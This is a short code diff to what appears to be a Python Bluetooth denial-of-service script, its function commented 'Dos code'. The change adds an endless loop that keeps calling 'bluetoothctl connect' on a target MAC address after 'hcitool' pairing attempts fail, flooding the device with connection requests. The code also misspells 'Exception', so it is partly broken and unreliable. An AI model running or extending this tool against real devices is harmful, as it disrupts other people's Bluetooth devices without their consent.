@@ -27,7 +27,11 @@ def send(): # Dos code
     try:
         os.system("sudo hcitool cc {} ; sudo hcitool auth {}".format(mac, mac))
     except Eception:
-        sys.exit()
+        try:
+            while True:
+                os.system("bluetoothctl connect {}".format(mac))
+        except Exception:
+            sys.exit()
 time.sleep(0.5)
 banner()
 while True:
